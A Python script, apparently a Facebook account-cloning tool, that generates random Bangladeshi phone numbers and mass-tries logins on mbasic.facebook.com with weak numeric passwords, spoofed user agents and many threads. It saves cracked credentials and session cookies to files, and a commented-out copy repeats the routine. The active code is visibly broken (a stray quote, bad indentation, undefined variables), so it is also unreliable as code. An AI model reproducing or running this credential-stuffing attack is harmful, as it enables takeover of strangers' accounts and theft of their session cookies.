import random,re,sys
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

loop = 0
oks = []
cps = []
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
  
# def rcrack(uid,pwx,tl):
#   print(uid,pwx,tl)
    
def rcrack(uid,pwx,tl):
  
    #print(user)
    loop = 0
    global cps
    global oks
    global proxy
    try:    
        
        pro = random.choice(ugen)
        session = requests.Session()
        free_fb = session.get('https://mbasic.facebook.com').text
        log_data = {
            lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'path':'/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=hvvxY_hJhY1DbD3I_WQfeRLj; sb=h_vxYz7vCDIyiGLBzokl0PbZ; rbyWTlcXI=eyJ1YUluZm8iOnsidXNlcmFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTEuMDsgV09XNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjU0MTAuMTQ0IFNhZmFyaS81MzcuMzYiLCJlbmdpbmUiOiJibGluayIsIm9zVHlwZSI6IndpbmRvd3MiLCJicm93c2VyIjoiY2hyb21lIiwiYnJvd3NlclZlcnNpb24iOnsibWFqb3IiOjExMCwiZnVsbCI6IjExMC4wLjU0MTAuMTQ0In19fQ--',
            'referer': 'https://mbasic.facebook.com/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝐌𝐄-𝐍𝐀𝐇𝐈𝐃-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                # cek_apk(session,coki)
                open('/sdcard/𝐌𝐄-𝐍𝐀𝐇𝐈𝐃-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[MEN-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝐌𝐄-𝐍𝐀𝐇𝐈𝐃-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop=loop+1
        sys.stdout.write(loop)
        sys.stdout.flush()
    except:
        print("invalid")
 
Phonenumber = []
def phoneNumber(operator):
  
  endNum = random.randint(10000000,99999999)
  number = f"01{operator}{endNum}"
  return number
  # Phonenumber.append(number)?

  
  
  
print('''
                CHOISE YOUR  OPERATOR 
                [1]GRAMEENPHONE
                [2]ROBI
                [3]BANGLALINK
''')
choise = input("Enter your choise: ")
amount = int(input("How many number you want:"))
tl = str(amount)
print(tl)
if choise == '1':
  for i in range(amount):
    phone = phoneNumber("7")
    uid = str(phone)
    pwx = uid[-6:]
    with ThreadPool(max_workers=500) as manshera:
      manshera.submit(rcrack,uid,pwx,tl)
    
    
elif choise == '2':
  for i in range(amount):
    phoneNumber(8)
elif choise == '3':
  for i in range(amount):
    phoneNumber(9)
 
else:
  print("Wrong input")
    
# APK CHECK
# def xxr():
#     user=[]
#     twf =[]
#     os.getuid
#     os.geteuid
#     os.system("clear")
#     print(logo)
#     print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
#     print(" ══════════════════════════════════════════")
#     rk1 = '0191'
#     rk2 = '0192'
#     rk3 = '0195'
#     rk4 = '019'
#     code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
#     os.system('clear')
#     print(logo)
#     limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
#     for nmbr in range(limit):
#         nmp = ''.join(random.choice(string.digits) for _ in range(7))
#         user.append(nmp)
#     os.system("clear")
#     print(logo)
#     passx = 0
#     HamiiID = []
#     print("")
#     for bilal in range(passx):
#         pww = input(f"[*] Enter Password {bilal+1} : ")
#         HamiiID.append(pww)
#     with ThreadPool(max_workers=50) as manshera:
#         clear()
#         tl = str(len(user))
#         jalan('\033[1;97m====================================================')
#         jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
#         jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
#         jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
#         jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
#         jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
#         jalan('\033[1;97m====================================================')
#         for love in user:
#             pwx = [love[1:]]
#             uid = code+love
#             for Eman in HamiiID:
#                 pwx.append(Eman)
#                 pwx.append(love)
#             manshera.submit(rcrack,uid,pwx,tl)
#     print(f"\n{x} ══════════════════════════════════════════")
# def rcrack(uid,pwx,tl):
#     #print(user)
#     global loop
#     global cps
#     global oks
#     global proxy
#     try:
#         for ps in pwx:
#             pro = random.choice(ugen)
#             session = requests.Session()
#             free_fb = session.get('https://mbasic.facebook.com').text
#             log_data = {
#                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
#             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
#             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
#             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
#             "try_number":"0",
#             "unrecognized_tries":"0",
#             "email":uid,
#             "pass":ps,
#             "login":"Log In"}
#             header_freefb = {'authority': 'mbasic.facebook.com',
#             "method": 'GET',
#             "scheme": 'https',
#             'path':'/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr',
#             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
#             'accept-language': 'en-US,en;q=0.9',
#             'cache-control': 'max-age=0',
#             # 'cookie': 'datr=hvvxY_hJhY1DbD3I_WQfeRLj; sb=h_vxYz7vCDIyiGLBzokl0PbZ; rbyWTlcXI=eyJ1YUluZm8iOnsidXNlcmFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTEuMDsgV09XNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjU0MTAuMTQ0IFNhZmFyaS81MzcuMzYiLCJlbmdpbmUiOiJibGluayIsIm9zVHlwZSI6IndpbmRvd3MiLCJicm93c2VyIjoiY2hyb21lIiwiYnJvd3NlclZlcnNpb24iOnsibWFqb3IiOjExMCwiZnVsbCI6IjExMC4wLjU0MTAuMTQ0In19fQ--',
#             'referer': 'https://mbasic.facebook.com/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr',
#             'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
#             'sec-ch-ua-mobile': '?0',
#             'sec-ch-ua-platform': '"Windows"',
#             'sec-fetch-dest': 'document',
#             'sec-fetch-mode': 'navigate',
#             'sec-fetch-site': 'same-origin',
#             'sec-fetch-user': '?1',
#             'upgrade-insecure-requests': '1',
#             'user-agent':pro}
#             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
#             log_cookies=session.cookies.get_dict().keys()
#             if 'c_user' in log_cookies:
#                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
#                 cid = coki[7:22]
#                 print('\r\r\033[1;32m[𝐌𝐄-𝐍𝐀𝐇𝐈𝐃-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
#                 cek_apk(session,coki)
#                 open('/sdcard/𝐌𝐄-𝐍𝐀𝐇𝐈𝐃-OK.txt', 'a').write( uid+' | '+ps+'\n')
#                 oks.append(cid)
#                 break
#             elif 'checkpoint' in log_cookies:
#                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
#                 cid = coki[24:39]
#                 #print('\r\r\33[1;30m[MEN-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
#                 open('/sdcard/𝐌𝐄-𝐍𝐀𝐇𝐈𝐃-CP.txt', 'a').write( uid+' | '+ps+' \n')
#                 cps.append(cid)
#                 break
#             else:
#                 continue
#         loop+=1
#         sys.stdout.write(f'\r\r%s{x}[{xr}𝐌𝐄-𝐍𝐀𝐇𝐈𝐃{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
#         sys.stdout.flush()
#     except:
#         pass
 
# xxr()
